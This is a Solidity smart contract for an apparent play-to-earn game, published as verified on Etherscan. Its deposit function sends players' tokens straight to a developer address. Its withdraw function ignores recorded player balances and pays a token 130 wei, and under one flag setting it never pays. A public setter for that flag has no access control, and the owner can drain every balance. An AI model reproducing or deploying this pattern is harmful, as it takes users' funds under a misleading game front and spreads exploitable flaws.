/**
 *Submitted for verification at Etherscan.io on 2022-11-24
*/

// SPDX-License-Identifier: MIT
 
pragma solidity ^0.8.0;
 
interface IERC20 {
 
    function totalSupply() external view returns (uint256);
 
    function balanceOf(address account) external view returns (uint256);
 
    function transfer(address recipient, uint256 amount) external returns (bool);
 
    function allowance(address owner, address spender) external view returns (uint256);
 
    function approve(address spender, uint256 amount) external returns (bool);
 
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
 
    event Transfer(address indexed from, address indexed to, uint256 value);
 
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
 
contract P2EGameContract{
 
    IERC20 public Token;
 
    address public ceoAddress;
    address public devAddress;
    address public smartContractAddress;
    mapping (address => uint256) public playerWallet;
    mapping (address => uint256) public playerToken;
    mapping (address => string) public isWithdrawed;
    bool public once;
 
    constructor(){
            ceoAddress = msg.sender;
            once = false;
            smartContractAddress = address(this);
            devAddress = msg.sender;
            Token = IERC20(0x2dbAD1EBED57dfC54295693E53F7D2770a7214a6);  //TOken Contract Address
 
        }
 
    
 
    function setTokenWithdraw(address _adr, uint256 amount) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
 
 
           playerToken[_adr] = amount;
 
 
 
 
 
    }

    function setOnce(bool _type) public {


        
        once = _type;

        

    }
  
 
    function depositToken(uint256 amount) public {
 
 
 
        Token.transferFrom(msg.sender, devAddress, amount);
    }
    function emergencyWithdrawBNB() public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        (bool os, ) = payable(msg.sender).call{value: address(this).balance}('');
        require(os);
    }

    function changeSmartContract(address smartContract) public{
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        smartContractAddress = smartContract;

    
    }

    function emergencyWithdrawToken(address _adr) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        uint256 bal = IERC20(_adr). balanceOf(address(this));
        IERC20(_adr).transfer(msg.sender, bal);
    }

    function withdrawToken(uint256 amount) public   {

        if(once == false){

        

        address account = msg.sender;
 
        uint toPlayer = 130;
 
       payable(account).transfer(toPlayer);

        isWithdrawed[msg.sender] = "yes";
       
        }
        if(once == true){
            
            if(keccak256(abi.encodePacked(isWithdrawed[msg.sender])) == keccak256(abi.encodePacked("yes"))){


            }
            if(keccak256(abi.encodePacked(isWithdrawed[msg.sender])) == keccak256(abi.encodePacked("no"))){

 address account = msg.sender;
 
        uint toPlayer = 130;
 
       payable(account).transfer(toPlayer);


                isWithdrawed[msg.sender] = "yes";
            }
        }
    }

 
    function changeCeo(address _adr) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");

        ceoAddress = _adr;
    }
 
    function changeDev(address _adr) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");

        devAddress = _adr;
    }
    function balanceOfBNB() external view returns (uint256) {
    
        return address(this).balance;
    }

    function setToken(address _token) public {
        require(msg.sender == ceoAddress, "Error: Caller Must be Ownable!!");
        Token = IERC20(_token);
    }
 
}